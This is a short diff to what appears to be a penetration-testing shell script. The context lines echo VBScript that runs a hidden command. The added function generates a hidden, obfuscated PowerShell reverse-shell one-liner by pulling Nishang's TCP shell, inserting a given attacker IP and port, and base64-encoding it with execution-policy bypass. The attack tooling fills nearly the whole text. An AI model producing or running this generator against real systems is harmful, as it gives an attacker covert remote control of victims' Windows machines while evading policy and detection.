@@ -45,3 +45,8 @@ echo 'Set shell = CreateObject("WScript.Shell")';
 echo 'shell.Run command,0';
 }
 
+
+powershell-reverse(){ 
+echo -n 'powershell -nOp  -w hIDdeN -EP bYPasS -e ';awk '/client/' /usr/share/nishang/Shells/*TcpOneLine.*| cut -d# -f2|sed -E 's/([0-9]{1,3}\.){3}[0-9]{1,3}/'$1'/;s/4444/'$2'/' |iconv -t UTF-16LE|base64|tr -d '\n';echo ;
+}
+
